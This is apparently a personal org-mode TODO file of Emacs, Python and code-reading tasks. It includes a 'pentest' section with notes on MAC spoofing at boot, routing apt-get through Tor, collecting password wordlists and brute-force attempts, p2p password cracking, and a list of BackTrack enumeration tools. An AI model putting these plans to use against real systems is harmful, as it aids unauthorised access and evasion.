   [[http://www.google.com/search%3Fq%3Demacs%2B%E6%9A%97%E5%8F%B7&hl%3Den&ie%3DUTF-8&oe%3DUTF-8&prmd%3Divns&ei%3DAbp5UOmEJMyYiAf6nYHwCg&start%3D10&sa%3DN][emacs 暗号 - Google Search]]
   <2012-10-14 Sun>
** TODO w3m minibuffer に link が表示されないようにする

   [[http://www.google.com/search%3Fq%3Demacs%2Bw3m%2Bminibuffer%2Blink&hl%3Dja&lr%3Dlang_ja&ie%3DUTF-8&oe%3DUTF-8&tbs%3Dlr:lang_1ja&prmd%3Divns&ei%3Dn117UKDAAqnImAWUj4HwAg&start%3D10&sa%3DN][emacs w3m minibuffer link - Google 検索]]
   <2012-10-15 Mon>
** TODO update-directory-autoloads に list の引数を渡せるようにする
   若しくは、 recursive-directory で書き直す

   [[file:~/.emacs.d/elisp/mylisp/make-init-loaddef.el::root%20emacs%20d%20elisp%20archives][file:~/.emacs.d/elisp/mylisp/make-init-loaddef.el::root emacs d elisp archives]]
   <2012-10-23 Tue>
** TODO [#B] byte-compile directory after svn commit

*** 背景 (問題点)
	svn commit 後ファイルの revision が変更され起動時に.elc
    .el の方が新しいと警告が出るので commit 後に byte-compile
    を自動化

*** 対応方法
	svn after hook
*** 優先順位の根拠
	compile をし忘れる
*** 備考
*** time/ref
<2012-11-06 Tue> / cf. [[file:~/mydoc/memo/memo.org::*keybind][keybind]]
** TODO [#A] svn commit log template

*** 背景 (問題点)
	commit log を書いていなかったのでこれを機に改善
*** 対応方法
	auto-insert や yasnippet から template を挿入
	若しくは、対話的に挿入していく
*** 優先順位の根拠
	よりよいコードを書く為に version 管理の改善を試みる
*** 備考
	1 行目は、ソースを何故修正したのか、一言で書き表す。
	2 行目はチケット No を書く。
	ソースの修正理由は、修正内容よりも、修正した理由をできる
    だけ書いた方がいい。
	ソースを差分比較すれば修正内容は分かるので、理由が一言でもあれば、ソースを理解しやすくなる。
*** time/ref
<2012-11-06 Tue> / cf. [[http://forza.cocolog-nifty.com/blog/2010/11/svn-91e6.html][SVN のコミットログの書き方: プログラマの思索]]
** TODO [#B] recentf 自動保存

*** 背景 (問題点)
	idle timer はあまり使いたくない
	しかし、 crash しても履歴は保存していてほしいので改善
*** 対応方法
	find-file-after-hook で idle-timer に recentf save を登録さ
    せる
	idle-timer を使わない場合 find-file がもたつく可能性があ
    る
	find-file-after-hook で実行する関数は idle-timer にすでに
    recentf-save が存在しているか確認する機能が必要
*** 優先順位の根拠
	crash 対策
*** 備考
*** time/ref
<2012-11-06 Tue> / cf. [[file:~/mydoc/memo/memo.org::*emacs%20jissen][emacs jissen]]
** TODO [#B] color-theme directory list-load-path-shadows

*** 結果
*** 背景 (問題点)
	color-theme の file が重複している

*** 対応方法
	remove file
*** 優先順位の根拠
	起動が遅くなっている可能性がある
*** 備考
*** time/ref
<2012-11-06 Tue> / cf.
** TODO [#C] auto-complete 時 に auto-highlight-symbol を停止

*** 結果
*** 背景 (問題点)
	auto-complete で補完時、 auto-highlight-symbol が実行され
    ると重くなる
*** 対応方法
	flymake の様に auto-complete で補完時に停止する。
*** 優先順位の根拠
	auto-highlight-symbol は現段階では実験中
*** 備考
*** time/ref
<2012-11-07 Wed> / cf. [[http://www.google.com/search%3Fq%3Dauto-highlight-symbol%2Bauto-complete&hl%3Dja&ie%3Dutf-8&oe%3Dutf-8&lr%3Dlang_ja][auto-highlight-symbol auto-complete - Google 検索]]
** TODO [#A] 日本語変換、辞書登録機能を利用した拡張を考える

*** 結果
*** 背景 (問題点)
	辞書登録を活用してみる。
	間違って日本語入力状態でタグを打ったりしてもスグに出るように「＜あ」で変換すると<a href=""></a>が出るとかしてるけど、そういう感じのをガンガン登録してみたらもちっと速くならないかな。
	意外にこの機能を使ってない人は多いのではないだろうか
*** 対応方法
	日本語変換
*** 優先順位の根拠
	良い拡張が作れそうな予感
*** 備考
*** time/ref
<2012-11-07 Wed> / cf. [[file:~/allinone.org::*][目標]]
** WAIT [#C] eval-after-load-progn 関数を作る

   1) 結果
   2) 背景 (問題点)
	  eval-after-load でいちいち progn を書かなくてはならない
      ので
   3) 対応方法
	  macro
   4) 優先順位の根拠
	  容易
   5) 備考
   6) time/ref
      <2012-11-09 Fri> / cf. [[file:~/.emacs.d/init/test_init.el::progn]]
** TODO [#C] Color Name 上からコマンドで該当 color-list に飛ぶか、その場に表示。

   1) 結果
   2) 背景 (問題点)
      source code に記載されている color code や 名前から色が
      わからない。
   3) 対応方法
      symbol 取得
      color-list 表示
      該当箇所へ search して飛ぶ
   4) 優先順位の根拠
      簡易かつ無くても困らない。
      あると便利。
   5) 備考
   6) time/ref
      <2012-11-20 Tue> / cf. [[file:~/.emacs.d/elisp/hl-line%2B.el::setq%20hl%20line%20face%20hl%20line][file:~/.emacs.d/elisp/hl-line+.el::setq hl line face hl line]]
** TODO [#C] 古い PC でも使える様にする

1) 結果
2) 背景 (問題点)
   古い PC で emacs を起動してももたつかないようにする。

3) 対応方法
   設定で system 環境を調べる
4) 優先順位の根拠
   緊急性はないが、いずれ使う機会はあると思う
   その時の為に備えておく。

5) 備考
6) time/ref
   <2012-11-25 Sun> / cf. [[http://www.google.com/search%3Fq%3DProperties%2Bemacs&hl%3Dja&ie%3Dutf-8&oe%3Dutf-8&lr%3Dlang_ja][Properties emacs - Google 検索]]
** TODO [#A] auto-save 文字化け

1) 結果
2) 背景 (問題点)
   auto-save した file が文字化けする
3) 対応方法

4) 優先順位の根拠
   重要な文章の損失を防ぐ
5) 備考
6) time/ref
   <2012-11-27 Tue> / cf. [[file:~/work/start-loader.el]]
** TODO [#C] start-loader-regexp-load の修正

1) 結果
2) 背景 (問題点)
   dolist で条件文が毎度呼ばれているので
   事前に変数に関数を入れる。
3) 対応方法
   backquart
4) 優先順位の根拠
   backquart が使いこなせるようになれば
5) 備考
6) time/ref
   <2012-11-27 Tue> / cf. [[file:~/.emacs.d/elisp/start.d/subroutines_start.el::if%20start%20loader%20profile%20flag][file:~/.emacs.d/elisp/start.d/subroutines_start.el::if start loader profile flag]]
** TODO [#C] check on Emacs 22 delete move to trash

1) 結果
2) 背景 (問題点)
   emacs 22 で削除した file が trash に移動しているか確認

3) 対応方法
4) 優先順位の根拠
   緊急の課題ではない
5) 備考
6) time/ref
   <2012-12-02 Sun> / cf. [[file:~/.emacs.d/elisp/start.d/Emacs22_trash-setting.el::LastChangedDate]]
** TODO [#C] org-remember の template

1) 結果
2) 背景 (問題点)
事前に作成した remember の template を変数として利用できない。
code が綺麗じゃないので利用できるようにする。

3) 対応方法
   org-remember の source を読む

4) 優先順位の根拠
   逼迫した需要はない
5) 備考
6) time/ref
    / cf. [[file:l:/Office/emacs/.emacs.d/elisp/start.d/org_mode_start.el::%3B%3B%20-*-%20Mode:%20Emacs-Lisp%20-*-][file:l:/Office/emacs/.emacs.d/elisp/start.d/org_mode_start.el::;; -*- Mode: Emacs-Lisp -*-]]
** TODO [#C] 関数名を反意文字に rotate する

1) 結果
2) 背景 (問題点)
   関数名によくつかわれる文字列を反意文字に rotate することに
   よって、簡易に一貫性を持たせることができる。
3) 対応方法
   rotate-text を使って elisp を書く
   open <=> close
   begin <=> end
   first <=> last
   min/max
   old/new
   visible/invisible
   source/target
   source/destination
   up/down
   big/small
   fast/slow
   tall/short
   real/false
   teach/learn
   fat/thin
   long/short
   go/stay
   hot/cold
   clean/dirty
   wet/dry
   dark/light
   sad/happy
   wide/narrow
   weak/strong
   ugly/beautiful

4) 優先順位の根拠
5) 備考
6) time/ref
    / cf. [[file:l:/Office/emacs/.emacs.d/elisp/start.d/Emacs_Lisp_mode_start.el::%3B%3B%20add-to-list%20rotate-text-rotations%20 ("t"%20"nil")][file:l:/Office/emacs/.emacs.d/elisp/start.d/Emacs_Lisp_mode_start.el::;; add-to-list rotate-text-rotations ("t" "nil")]]
** TODO [#C] change log 入力を統一

1) 背景 (問題点)
   外部の change log と file 内の change log の入力を同じインター
   フェースでおこなう。

2) 対応方法
   changelog.txt の関数から内容を取得

3) 優先順位の根拠
   あればよりよいコーディングができるが
   緊急性はない

4) 備考

5) 結果
6) time/ref
    / cf. [[file:p:/Office/emacs/.emacs.d/allinone.org::*Stack:][Stack:]]
** TODO [#B] stack point with link buffer & anything

1) 背景 (問題点)
   簡易に元にいた関数へ移動したい

2) 対応方法
   stack して buffer から飛ぶ

3) 優先順位の根拠
   実装できるとかなり捗る

4) 備考

5) 結果
6) time/ref
    / cf. [[file:p:/system/PortablePython/test/Lib/site-packages/pylint/lint.py::version,%20astng_version,%20common_version,%20sys.version)][file:p:/system/PortablePython/test/Lib/site-packages/pylint/lint.py::version, astng_version, common_version, sys.version)]]
** TODO [#C] C mode auto semicolon

1) 背景 (問題点)
   semicolon を付記し忘れを防ぐ

2) 対応方法


3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:/media/Data/MYTEMP/CPRIMER/page-0038.png]]
** TODO [#C] elisp compress to gz ".el" => ".el.gz"

1) 背景 (問題点)


2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.emacs.d/elisp/plugin/auto-async-byte-compile.el::(string-match%20"\\.el$"%20buffer-file-name)][file:~/.emacs.d/elisp/plugin/auto-async-byte-compile.el::(string-match "\\.el$" buffer-file-name)]]
** TODO [#C] python mode create parameter and function

1) 背景 (問題点)
   like pycharm

2) 対応方法
move parameter point or out function or class

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/wm/_core.py::def%20__init__(self,%20window,%20display%3DNone,%20cachetime%3D0.5):][file:~/.pylib/wm/_core.py::def __init__(self, window, display=None, cachetime=0.5):]]
** TODO [#C] python format yasnippet

1) 背景 (問題点)
usable yasnippet write format string

2) 対応方法


3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf.
** TODO [#C] python elisp, convert append=[] for loop to list compreehension

1) 背景 (問題点)
   tes = []
   for x in list:
       if x.startswith ('_'):
          tes.append (x)
   =>
   [x for x in list if x.startswith ('_')]

2) 対応方法
   write elisp

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf.
** DONE [#C] e2wm C-: C-i move cursor sub ipython 
   CLOSED: [2013-12-03 Tue 16:47]

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf.
** TODO [#C] e2wm plugin fixme, todo, bug annotation list

1) 背景 (問題点)

2) 対応方法
   select and move such a point

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf.
** TODO [#C] flycheck wave annotation to backgraund overlay

1) 背景 (問題点)
   misreading , & . on wave annotation

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf.
** TODO [#C] iswitchb C-: fix define

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.emacs.d/elisp/start.d/iswitchb_plugin_start.el::%3B%3B%20coding:%20utf-8][file:~/.emacs.d/elisp/start.d/iswitchb_plugin_start.el::;; coding: utf-8]]
** TODO [#C] python module auto-insert M key as blank for big module.

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/xahk/remap/builder/mainbuilder.py]]
* python:
** create init script by python
** TODO [#C] rope を読む

    [[file:/pentest/exploits/set/set::reload%20src%20core%20set][file:/pentest/exploits/set/set::reload src core set]]
    <2013-01-04 Fri>
** TODO [#C] standard library のカテゴリから module を選び挿入
    TEXT              string, textwrap, re
    DATA STRUCTURES   collections, bissect struct
    DATES AND TIMES   time, datetime, calendar
    ALGORITHMS        functools, operator
    MATHEMATICS       decimal, fractions, random, math
    etc..


    [[file:l:/Autohotkey/keybind.ahk]]
    <2013-01-19y>
** TODO [#C] surround command

1) 背景 (問題点)
   try, while, if, 文で囲む。

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:p:/Lib/.pylib/portable/update_usb.py::UPDATER_DIR%20%3D%20os.path.join (THIS_SCRIPT_DIR,%20SUBDIRNAME)][file:p:/Lib/.pylib/portable/update_usb.py::UPDATER_DIR = os.path.join (THIS_SCRIPT_DIR, SUBDIRNAME)]]
** TODO [#C] portable usb python script forensic

   [[file:~/mydoc/memo/memo.org::*create%20init%20script%20by%20python][create init script by python]]
   <2012-09-30 Sun>
** TODO [#C] def class の間の space を整る

1) 背景 (問題点)
   style guide に沿った coding を自動でできるように

2) 対応方法
   yasnippet and refactore whole buffer

3) 優先順位の根拠


4) 備考
   pep8

5) 結果
6) time/ref
    / cf.
** TODO [#C] weekly rsync usb ni

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf.
** TODO [#C] daily prompt always on top

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/aquos.py::-%20`passwd`:][file:~/.pylib/aquos.py::- `passwd`:]]
** TODO [#C] create ifstatement-p by elisp

1) 背景 (問題点)
   check in ifstatement-p

2) 対応方法
   check if line and operand varance

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/work/Python_Testing_Beginners_Guide/page-0022.png]]
** TODO [#C] backup restore ni check connected network

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/weekly.py::print ('move%20archive%20folder')][file:~/.pylib/weekly.py::print ('move archive folder')]]
** TODO [#C] refact all .pylib package

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/ref/__init__.py]]
** TODO [#C] beep on sys.expecthook

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/mytemp/beepmod.py::beeps%20%3D%20chr (amplitude)%20*%20half_period%20%2B%20chr (0)%20*%20half_period][file:~/.pylib/mytemp/beepmod.py::beeps = chr (amplitude) * half_period + chr (0) * half_period]]
** TODO [#C] ipython if get ImportError, suggetion similar package names as interctive

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/ipython_config.py::try:]]
** TODO [#C] function usable finish command

1) 背景 (問題点)

2) 対応方法
   rope-organize-import, pylint, nose, profile, overview

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf.
** TODO [#C] ipython ImportError and search similer name

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[http://www.google.com/search?q%3Dipython%2Bimporterror%2Bsimiller%2Bname&hl%3Den&ie%3Dutf-8&oe%3Dutf-8][ipython importerror similler name - Google Search]]
** TODO [#C] __exit__ need 4 argment, check with statement in test

1) 背景 (問題点)
if write this "def __exit__(self):" 
=> got error
TypeError: __exit__() takes exactly 1 argument (4 given)

we need write this "def __exit__(self, type, value, tb):"
but flymake not catch error.

2) 対応方法
auto test writer

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf.
* assembly:
* C C++:
** code_reading
*** code reading
	bacula 設定ファイル読み込み
	設定ファイルの構文に柔軟性があるので

    [[file:/mnt/ki/etc/bacula/bacula-dir.conf::Run%20Differential][file:/mnt/ki/etc/bacula/bacula-dir.conf::Run Differential]]
    <2011-08-08 Mon>

	laptop-detect
	apt-get
	iptables
** TODO code reading
   ethtool のケーブルが抜けているかどうかを確認する仕組みを調べる

   <2011-10-01 Sat>
** TODO [#C] : and ; coloring for miss reading
    
    [[file:/data/archive/ref/book/Programming/C_C++/C++/The_C++_standard_library_a_tutorial_and_reference/0205_The_C++_standard_library_a_tutorial_and_reference.png]]
** NOTE [#A] 
// clas_func.cc
class Test
{
public:
  void operator () (){
    ;
  }
};


int main (int argc, char **argv)
{
  for (int i = 0; i<1000000000; ++i)
    {
      Test ();
    }
  
  return 0;
}

// func.cc
void Test (){
  ;
}

int main (int argc, char **argv)
{
  for (int i = 0; i<1000000000; ++i)
    {
      Test ();
    }
  return 0;
}

    
# g++ -std=c++11 class_func.cc    
# time ./a.out                
./a.out  0.23s user 0.00s system 99% cpu 0.235 total

# g++ -std=c++11 func.cc
# time ./a.out          
./a.out  7.04s user 0.00s system 99% cpu 7.079 total
* server
** selinux
** kernel
** RAID1
** TODO recompile openssh
   - remove Banner
   - disable ipv6
* pentest
** learning backtrack
** change mac address on boot time
   - macchanger -e eth*
	 http://www.shadowrx.com/forums/showthread.php?t=1536




     <2011-09-12 Mon>

** IT law gathering
** apt-get throuth tor
** Boot Setting
*** 1. Stealth
	- no networking
	- ntp で時間を設定しない hwclock から取得
*** 2. Default
	- 時間を ntp で設定
	- rsync
*** 3. Fast crack
**** ケーブルが抜けているかどうかの確認
	 ethtool eth0

	 Link: detected : no


     <2011-10-01 Sat>

**** gathering hardware information
	 - ハードウェアの情報を集めるプログラム or スクリプトを作成。
	 - lspci
	 - lsusb
	 - hwinfo
	 - lshw
	 - dmidecode
	 - sensors
	 - fdisk -l , cat /proc/partitions
	 - hdparm -i <dev>
	 - hddtemp

*** 4. Forensic

** TODO gathering wordlist
   - sort 集めた wordlist を sort する。
   - 保有している wordlist に含まれていない wordlist を作成
	 即ち、保有している wordlist を試せば pure brute となるようにする。
	 おそらく、この wordlist を作成すれば膨大な容量になってしまうので
	 それに準ずるような物を考える。
   - honey pot を設置して ssh brute force の password を集める。
** TODO mailing list
** TODO Traceroute on Google Earth
** TODO /pentest/enumeration/ids/ftester
** TODO /pentest/enumeration/ids/pytbull/pytbulll
** TODO /pentest/enumeration/smtp/smtp-user-enum
** TODO /pentest/enumeration/smtp/swaks
** TODO /pentest/enumeration/web/cms-explorer
** TODO /pentest/enumeration/web/revhosts
** TODO /pentest/enumeration/web/whatweb
** TODO /pentest/enumeration/miranda

** TODO /pentest/enumeration/lanmap2
** TODO p0f
* Program
** TODO news timeline

   <2011-08-09 Tue>
** TODO 鯖落ち情報サイト


   <2011-07-25 Mon>

** TODO crack password by p2p
- cluster computing
** TODO cooking
   料理の材料リストアップなど自動化するプログラム作成
   メール送信機能なども実装。

   [[info:elisp:Lists]]
   <2011-09-17 Sat>

** TODO RSS [0/1]
   - [ ] Chromium-browser のソースを読む
*** 実装予定 [/]
	- [ ] 読んだ記事の統計を取る。
	- [ ] 新聞のようなスクラップ機能
**** 高機能な filter
	 - [ ] 広告の排除

** TODO autoit from emacs
auto it
autohotkey like elisp
** TODO oz
- elisp auto hotkey like
pywinauto autohotkey autoit
deffered.el
*** similer program
- autohotkey
- autoit
-
** TODO tracking me
- timeline
- excel

** TODO local network mapping real time
- lanmap
- netdiscover
** TODO shopping 
- search most low price
- search amazon, rakuten etc..
- show google map shopping location

** TODO emacs one note
- edit same file by multi user
** TODO hazard now
   - smart phone application
   - alert from hazard map
   
* Daily Task
** TODO Timeline [5/14]
   - [X] wireless securitytube
   - [X] backtrack5 wireless pdf
   - [X] metasploit pdf
   - [ ] securitytube assembly
   - [X] lfs-Book pdf
   - [ ] sed awk をマスター
   - [X] fhs-2.3.pdf directory name historicary
   - [ ] kernel reading
   - [ ] gcc reading
   - [ ] sh reading
   - [ ] zsh reading
   - [ ] wireshark reading
   - [ ] Structure_and_Interpretation_of_Computer_Programs.pdf
   - [ ] The_ShellCoder's_Handbook-Discovering_and_Exploiting_Security_Holes,2nd_Edition.pdf
** TODO code reading
*** C/C++
**** chrome
**** python
**** kernel
**** gcc
**** wireshark
**** tor
**** autohotkey
*** Elisp [11/91]
   - Rule
# 一日 =2= file source を読む
# source を読み改善できるところは改善する
# dot.emacs に反映させる。
**** TODO file:/root/work/emacs23-23.1+1/lisp/url/
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-about.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-auth.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-cache.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-cid.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-cookie.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-dav.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-dired.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-expand.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-file.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-ftp.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-gw.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-handlers.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-history.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-http.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-imap.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-irc.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-ldap.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-mailto.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-methods.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-misc.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-news.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-nfs.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-ns.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-parse.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-privacy.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-proxy.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-util.el
***** TODO file:/root/work/emacs23-23.1+1/lisp/url/url-vars.el

**** DONE file:/root/work/emacs23-23.1+1/lisp/emacs-lisp/byte-run.el
**** DONE 50% file:/root/work/emacs23-23.1+1/lisp/emacs-lisp/backquote.el
	 backquote-listify
	 backquote-process
	 backquote-delay-process
***** scratch
	  (setq b '(ba bb bc))
	  (ba bb bc)
	  b
	  (ba bb bc)
	  `(a b c)
	  `(a ,b c)
	  (a (ba bb bc) c)
	  `(a ,@b c)
	  (a ba bb bc c)

	  (defmacro backquote-list*-macro-tes (first &rest list)
	  "Like `list' but the last argument is the tail of the new list.

	  For example (backquote-list* 'a 'b 'c) => (a b . c)"
	  ;; The recursive solution is much nicer:
	  ;; (if list (list 'cons first (cons 'backquote-list*-macro list)) first))
	  ;; but Emacs is not very good at efficiently processing such things.
	  (setq list (nreverse (cons first list))
	  first (car list)
	  list (cdr list))
	  (if list
      (let* ((second (car list))
	  (rest (cdr list))
	  (newlist (list 'cons second first)))
	  (while rest
	  (setq newlist (list 'cons (car rest) newlist)
	  rest (cdr rest)))
	  newlist)
      first))

	  (backquote-list*-macro-tes 'a 'b 'c 'd)




	  (defmacro backquotetes (structure)
	  "Argument STRUCTURE describes a template to build.

	  The whole structure acts as if it were quoted except for certain
	  places where expressions are evaluated and inserted or spliced in.

	  For example:

	  b              => (ba bb bc)		; assume b has this value
	  `(a b c)       => (a b c)		; backquote acts like quote
	  `(a ,b c)      => (a (ba bb bc) c)	; insert the value of b
	  `(a ,@b c)     => (a ba bb bc c)	; splice in the value of b

	  Vectors work just like lists.  Nested backquotes are permitted."
	  (cdr (backquote-processtes structure)))




	  (defun backquote-processtes (s &optional level)
	  "Process the body of a backquote.
	  S is the body.  Returns a cons cell whose cdr is piece of code which
	  is the macro-expansion of S, and whose car is a small integer whose value
	  can either indicate that the code is constant (0), or not (1), or returns
	  a list which should be spliced into its environment (2).
	  LEVEL is only used internally and indicates the nesting level:
	  0 (the default) is for the toplevel nested inside a single backquote."
	  (unless level (setq level 0))
	  (cond
	  ((vectorp s)
      (let ((n (backquote-process (append s ()) level)))
      (if (= (car n) 0)
	  (cons 0 s)
	  (cons 1 (cond
	  ((not (listp (cdr n)))
	  (list 'vconcat (cdr n)))
	  ((eq (nth 1 n) 'list)
	  (cons 'vector (nthcdr 2 n)))
	  ((eq (nth 1 n) 'append)
	  (cons 'vconcat (nthcdr 2 n)))
	  (t
	  (list 'apply '(function vector) (cdr n))))))))
	  ((atom s)
      (cons 0 (if (or (null s) (eq s t) (not (symbolp s)))
	  s
	  (list 'quote s))))
	  ((eq (car s) backquote-unquote-symbol)
      (if (<= level 0)
      (cons 1 (nth 1 s))
      (backquote-delay-processtes s (1- level))))
	  ((eq (car s) backquote-splice-symbol)
      (if (<= level 0)
      (cons 2 (nth 1 s))
      (backquote-delay-processtes s (1- level))))
	  ((eq (car s) backquote-backquote-symbol)
      (backquote-delay-processtes s (1+ level)))
	  (t
      (let ((rest s)
	  item firstlist list lists expression)
      ;; Scan this list-level, setting LISTS to a list of forms,
      ;; each of which produces a list of elements
      ;; that should go in this level.
      ;; The order of LISTS is backwards.
      ;; If there are non-splicing elements (constant or variable)
      ;; at the beginning, put them in FIRSTLIST,
      ;; as a list of tagged values (TAG . FORM).
      ;; If there are any at the end, they go in LIST, likewise.
      (while (and (consp rest)
      ;; Stop if the cdr is an expression inside a backquote or
      ;; unquote since this needs to go recursively through
      ;; backquote-process.
      (not (or (eq (car rest) backquote-unquote-symbol)
      (eq (car rest) backquote-backquote-symbol))))
	  (setq item (backquote-process (car rest) level))
	  (cond
	  ((= (car item) 2)
	  ;; Put the nonspliced items before the first spliced item
	  ;; into FIRSTLIST.
	  (if (null lists)
	  (setq firstlist list
	  list nil))
	  ;; Otherwise, put any preceding nonspliced items into LISTS.
	  (if list
	  (push (backquote-listifytes list '(0 . nil)) lists))
	  (push (cdr item) lists)
	  (setq list nil))
	  (t
	  (setq list (cons item list))))
	  (setq rest (cdr rest)))
      ;; Handle nonsplicing final elements, and the tail of the list
      ;; (which remains in REST).
      (if (or rest list)
	  (push (backquote-listifytes list (backquote-process rest level))
      lists))
      ;; Turn LISTS into a form that produces the combined list.
      (setq expression
	  (if (or (cdr lists)
	  (eq (car-safe (car lists)) backquote-splice-symbol))
	  (cons 'append (nreverse lists))
	  (car lists)))
      ;; Tack on any initial elements.
      (if firstlist
	  (setq expression (backquote-listifytes firstlist (cons 1 expression))))
      (if (eq (car-safe expression) 'quote)
	  (cons 0 (list 'quote s))
	  (cons 1 expression))))))

	  (backquotetes `(a ,b c))

	  b

	  b              => (ba bb bc)		; assume b has this value
	  `(a b c)       => (a b c)		; backquote acts like quote
	  `(a ,b c)      => (a (ba bb bc) c)	; insert the value of b
	  `(a ,@b c)     => (a ba bb bc c)	; splice in the value of b


	  (defun backquote-delay-processtes (s level)
	  "Process a (un|back|splice) quote inside a backquote.
	  This simply recurses through the body."
	  (let ((exp (backquote-listifytes (list (cons 0 (list 'quote (car s))))
      (backquote-process (cdr s) level))))
      (if (eq (car-safe exp) 'quote)
      (cons 0 (list 'quote s))
      (cons 1 exp))))


	  (defun backquote-listifytes (list old-tail)
	  (let ((heads nil) (tail (cdr old-tail)) (list-tail list) (item nil))
      (if (= (car old-tail) 0)
	  (setq tail (eval tail)
	  old-tail nil))
      (while (consp list-tail)
      (setq item (car list-tail))
      (setq list-tail (cdr list-tail))
      (if (or heads old-tail (/= (car item) 0))
	  (setq heads (cons (cdr item) heads))
	  (setq tail (cons (eval (cdr item)) tail))))
      (cond
      (tail
      (if (null old-tail)
	  (setq tail (list 'quote tail)))
      (if heads
	  (let ((use-list* (or (cdr heads)
	  (and (consp (car heads))
	  (eq (car (car heads))
	  backquote-splice-symbol)))))
	  (cons (if use-list* 'backquote-list* 'cons)
	  (append heads (list tail))))
	  tail))
      (t (cons 'list heads)))))

**** DONE file:/root/work/emacs23-23.1+1/lisp/subr.el
***** event-modifiers
	  logand lognot logior
***** event-basic-type
**** DONE file:/root/work/emacs23-23.1+1/lisp/version.el
**** DONE file:/root/work/emacs23-23.1+1/lisp/widget.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/custom.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/emacs-lisp/map-ynp.el
**** DONE file:/root/work/emacs23-23.1+1/lisp/cus-start.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/international/mule.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/international/mule-conf.el
**** DONE file:/root/work/emacs23-23.1+1/lisp/env.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/format.el
**** DONE file:/root/work/emacs23-23.1+1/lisp/bindings.el
**** DONE file:/root/work/emacs23-23.1+1/lisp/files.el
**** DONE file:/root/work/emacs23-23.1+1/lisp/cus-face.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/faces.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/minibuffer.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/button.el
**** DONE file:/root/work/emacs23-23.1+1/lisp/startup.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/loaddefs.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/ldefs-boot.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/abbrev.el
**** POSTPONES file:/root/work/emacs23-23.1+1/lisp/simple.el
- minibuffer
- shell-command
**** TODO file:/root/work/emacs23-23.1+1/lisp/help.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/jka-cmpr-hook.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/epa-hook.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/international/mule-cmds.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/case-table.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/international/characters.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/composite.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/international/charprop.el
